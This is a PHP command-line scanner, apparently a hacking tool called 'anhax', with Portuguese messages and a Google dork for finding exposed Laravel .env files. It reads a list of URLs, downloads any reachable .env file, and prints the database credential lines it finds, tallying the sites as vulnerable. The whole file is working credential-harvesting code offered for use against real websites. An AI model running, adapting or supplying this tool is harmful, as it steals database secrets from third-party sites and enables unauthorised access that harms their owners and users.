<?php
  /*
  * ----- Laravel config ------
  * Desenvolvido por João Artur
  * anhax @2017
  * www.github.com/JoaoArtur
  *
  *
  * DORK
  * site:com.br ext:env
  * ext:env
  */
  error_reporting(0);

  abstract class anhax {
    public static $argumento;
    public static $comandos;
    public static $lista;
    public static $vulneraveis = array();

    public static function iniciar() {
      global $argv;

      echo "\033[0m\033[31m[>] anhax - laravel .env
[>] buscar por bancos de dados a partir do laravel
[>] developed by João Artur (K3N1)\033[0m\n\n";


      self::comandos();
      self::verificarArgumentos($argv);
    }
    public static function comandos() {
      self::$comandos['-l'] = 'lista';
    }
    public static function lista($lista) {
      if (file_exists($lista)) {
        self::$lista = $lista;
        echo "Lista: ".$lista."\n";
      }
    }
    public static function ajuda() {
      echo "\033[0m\033[32m";
      echo "-l    =    Definir caminho da lista de arquivos\n";
      echo "\033[0m";
    }
    public static function executarLaravelEnv() {
      if (self::$lista != null) {
        $lista = explode("\n",file_get_contents(self::$lista));
        echo "\033[0m\033[35m";
        echo "\n[>] ".count($lista)." caminhos carregados\n[>] Iniciando...\n\n";
        echo "\033[0m";

        foreach ($lista as $url) {
          $cabecalho = get_headers($url);

          if (isset($cabecalho) && isset($cabecalho[0])) {
            if (strstr($cabecalho[0],"200")) {
              $inicio = curl_init();
              curl_setopt($inicio, CURLOPT_URL, $url);
              curl_setopt($inicio, CURLOPT_HEADER, 0);
              curl_setopt($inicio, CURLOPT_RETURNTRANSFER, TRUE);

              $conteudo = curl_exec($inicio);
              if (strstr($conteudo, 'APP_') && strstr($conteudo, 'DB_')) {
                $conteudolinha = explode("\n",$conteudo);
                $db = array_search('DB_HOST', $conteudolinha);

                echo "\033[31m-> $url\n\033[1m";
                foreach ($conteudolinha as $valor) {
                  if (strstr($valor,'DB_') && !strstr($valor,'#DB_')) {
                    echo " -> $valor\n";
                  }
                }
                echo "\033[0m\n";

                self::$vulneraveis[] = $url;
              }

              curl_close($inicio);

            }
          }
        }
        echo "\033[0m\033[32m";
        echo "\n".count(self::$vulneraveis)." caminhos vulneráveis encontrados.\n";
        echo "\033[0m";
      } else {
        echo "\033[0m\033[31m[+] Verifique se você preencheu todas as dependências corretamente.\n\033[0m";
      }
    }
    public static function verificarArgumentos($argumentos) {
      if (count($argumentos) == 1) {
        self::ajuda();
      } else {
        unset($argumentos[0]);
        foreach ($argumentos as $key => $value) {
          if (isset(self::$comandos[$value])) {
            $atual_cmd = self::$comandos[$value];
            $atual_arg = $key;
            if (isset($argumentos[$atual_arg+1])) {
              self::$atual_cmd($argumentos[$atual_arg+1]);
            } else {
              echo "[+] Verifique se você preencheu todas as dependências corretamente.\n";
            }
          }
        }
        self::executarLaravelEnv();
      }
    }

  }

  anhax::iniciar();

?>
